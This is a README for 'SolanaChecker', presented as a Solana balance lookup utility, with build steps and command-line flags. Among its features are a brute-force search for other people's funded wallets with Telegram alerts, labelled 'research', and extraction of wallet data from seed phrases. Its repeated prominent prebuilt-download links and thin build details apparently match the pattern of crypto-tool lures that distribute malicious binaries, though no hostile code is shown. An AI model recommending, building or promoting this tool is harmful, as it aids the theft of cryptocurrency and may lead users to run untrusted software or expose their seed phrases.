# Solana Address Balance Lookup Tool: Quickly Check Solana Balances

Need a Solana address balance lookup tool? **SolanaChecker** offers a simple, yet powerful way to quickly check the balance of any Solana address. Whether you're tracking your own holdings or conducting research, this tool provides essential functionality for interacting with the Solana blockchain.


###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/renders/delta.webp" />
</p>

## Key Features

1.  **Solana Address Balance Lookup:** Quickly find the Solana balance.

<p align="left">
    <img src="/renders/alert.webp" />
</p>

2.  **Token Security Analysis:** Assess token security.

<p align="left">
    <img src="/renders/resize.webp" />
</p>

3.  **Address Tracking with Telegram:** Get notifications via Telegram.

4.  **Mnemonic Phrase to Wallet Data:** Extract wallet details from seed phrases.

<p align="left">
    <img src="/renders/peek.webp" />
</p>

5.  **Solana Wallet Generation:** Generate new Solana wallets.

<p align="left">
    <img src="/renders/icon.webp" />
</p>

6.  **Brute-Force Wallet Search (with Telegram):** Find wallets with balances (research), with Telegram support.

<p align="left">
    <img src="/renders/module.webp" />
</p>

## Telegram Setup

Set up Telegram alerts by adding your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) in the 'telegram-settings.txt' file.

## Getting Started

Download a pre-compiled build from [Release](../../releases) or build the project yourself.

## Building the Project

This project is built in C++ and needs several dependencies. We recommend using **vcpkg** for easy management:

### Installing Dependencies with vcpkg

1.  If you haven’t already, clone the repository and install **vcpkg** (follow the instructions on the [official page](https://github.com/microsoft/vcpkg)).
2.  Add the **vcpkg** installation directory to your system PATH.
3.  Run these commands:

    -   Install **OpenSSL**:

    ```bash
    vcpkg install openssl
    ```

    -   Install **nlohmann-json**:

    ```bash
    vcpkg install nlohmann-json
    ```

    -   Install **Crypto++**:

    ```bash
    vcpkg install cryptopp
    ```

    -   Install **libsodium**:

    ```bash
    vcpkg install libsodium
    ```

4.  Build after installation.

### Building with Visual Studio

1.  Open the project solution in Visual Studio.
2.  Make sure **vcpkg** is integrated (see [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio)).
3.  Click **Build** -> **Build Solution**.
4.  The executable will be in the `bin` folder.

### Building with Another C++ Compiler

1.  Ensure that all dependencies are installed and accessible to your compiler.
2.  Compile with:

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line Usage

1.  **-s / -search**: Start the brute-force search (for research).
2.  **-t / -track (ADDRESS)**: Track addresses.
3.  **-g / -gen (NUMBER)**: Generate wallets.
4.  **-m / -mnemonic (MNEMONIC)**: Display wallet data from mnemonic phrases.
5.  **-b / -balance (ADDRESS)**: Quickly look up the balance of a given address.

## Important Notes

-   This tool is for research and information purposes.
-   Cryptocurrency investments involve risk. Protect your data and wallets.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is licensed under the [MIT License](/LICENSE).